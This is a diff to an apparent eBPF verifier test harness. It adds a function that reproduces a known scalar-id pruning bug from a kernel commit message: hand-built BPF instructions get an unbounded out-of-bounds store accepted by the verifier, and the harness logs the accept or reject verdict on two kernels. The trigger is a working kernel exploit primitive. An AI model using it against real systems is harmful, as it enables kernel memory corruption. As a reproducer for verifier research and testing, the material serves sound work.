@@ -43,6 +43,9 @@
 #define BPF_JMP32_IMM(OP, DST, IMM, OFF)                                       \
     ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_K,                 \
                        .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
+#define BPF_JMP_REG(OP, DST, SRC, OFF)                                         \
+    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X,                   \
+                       .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
 #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                                       \
     ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,             \
                        .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
@@ -268,6 +271,52 @@ static void dump(const char *name, int map_fd, enum arm arm, enum payload pl, ui
     if (fd >= 0) close(fd);
 }
 
+/* ---- H21 (1ffc85d9298e) tetikleyicisi: commit mesajinin KENDI ornegi, birebir ----
+ *   1: r9 = pointer with range X      7: r9 += r7
+ *   2: r6 = unbound scalar ID=a       8: *(u64 *)r9 = Y
+ *   3: r7 = unbound scalar ID=b
+ *   4: if (r6 > r7) goto +1          Path I  (1-6):    r6{id=b} r7{id=b}  -> r7 bounded
+ *   5: r6 = r7                       Path II (1-4,6):  r6{id=a} r7{id=b}  -> r7 UNBOUNDED
+ *   6: if (r6 > X) goto ...          Buggy regsafe: no check_ids on scalars -> I == II
+ *   --- checkpoint ---               -> path II pruned into I -> UNSAFE store ACCEPTED.
+ * 2023-06 buggy kernel: MOV of a scalar mints an id (the fix stops doing that for
+ * constants only), so `r1 = r6` / `r2 = r7` give r6 and r7 distinct ids. */
+static void dump_h21(const char *name, int map_fd, uint32_t flags) {
+    struct bpf_insn p[32]; int n = 0;
+    p[n++] = BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0);
+    p[n++] = BPF_MOV64_REG(BPF_REG_2, BPF_REG_10);
+    p[n++] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4);
+    { struct bpf_insn ld[] = { BPF_LD_MAP_FD(BPF_REG_1, map_fd) }; p[n++] = ld[0]; p[n++] = ld[1]; }
+    p[n++] = BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem);
+    int jnull = n; p[n++] = BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0);
+    p[n++] = BPF_MOV64_REG(BPF_REG_9, BPF_REG_0);            /* 1: ptr, range 64   */
+    p[n++] = BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0);   /* 2: unbound scalar  */
+    p[n++] = BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 8);   /* 3: unbound scalar  */
+    p[n++] = BPF_MOV64_REG(BPF_REG_1, BPF_REG_6);            /*    mint id=a on r6 */
+    p[n++] = BPF_MOV64_REG(BPF_REG_2, BPF_REG_7);            /*    mint id=b on r7 */
+    p[n++] = BPF_JMP_REG(BPF_JGT, BPF_REG_6, BPF_REG_7, 1);  /* 4                  */
+    p[n++] = BPF_MOV64_REG(BPF_REG_6, BPF_REG_7);            /* 5: r6.id = b       */
+    int jx = n; p[n++] = BPF_JMP_IMM(BPF_JGT, BPF_REG_6, 56, 0); /* 6: X = 64-8    */
+    p[n++] = BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_7);   /* 7                  */
+    p[n++] = BPF_ST_MEM(BPF_DW, BPF_REG_9, 0, 0x59);         /* 8: the store       */
+    int exitl = n;
+    p[n++] = BPF_MOV64_IMM(BPF_REG_0, 0);
+    p[n++] = BPF_EXIT_INSN();
+    p[jnull].off = exitl - jnull - 1;
+    p[jx].off    = exitl - jx - 1;
+
+    union bpf_attr a; memset(&a, 0, sizeof(a));
+    a.prog_type = BPF_PROG_TYPE_SOCKET_FILTER; a.insn_cnt = n;
+    a.insns = (uint64_t)(unsigned long)p; a.license = (uint64_t)(unsigned long)"GPL";
+    a.log_level = 2; a.log_size = sizeof(g_log); a.log_buf = (uint64_t)(unsigned long)g_log;
+    a.prog_flags = flags; g_log[0] = '\0';
+    int fd = bpf(BPF_PROG_LOAD, &a, sizeof(a)); int e = errno;
+    printf("===P3PROG name=%s flags=%s verdict=%s errno=%d insns=%d ===\n",
+           name, flags ? "freq" : "0", fd >= 0 ? "accept" : "reject", fd >= 0 ? 0 : e, n);
+    printf("---LOG---\n%s\n---END---\n", g_log); fflush(stdout);
+    if (fd >= 0) close(fd);
+}
+
 int main(void) {
     union bpf_attr m;
     memset(&m, 0, sizeof(m));
@@ -309,6 +358,12 @@ int main(void) {
     dump("MG_maygoto",      map_fd, ARM_FULL, PL_MAYGOTO, 0);
     dump("MG_maygoto_freq", map_fd, ARM_FULL, PL_MAYGOTO, 1u << 3);
     printf("P3 END\n");
+
+    /* --- Parti 5: H21 gorunur-kol kalibrasyonu (iki kernelde kosulur) --- */
+    printf("P5 BEGIN\n");
+    dump_h21("H21_scalar_ids",      map_fd, 0);
+    dump_h21("H21_scalar_ids_freq", map_fd, 1u << 3);
+    printf("P5 END\n");
     close(map_fd);
     return 0;
 }
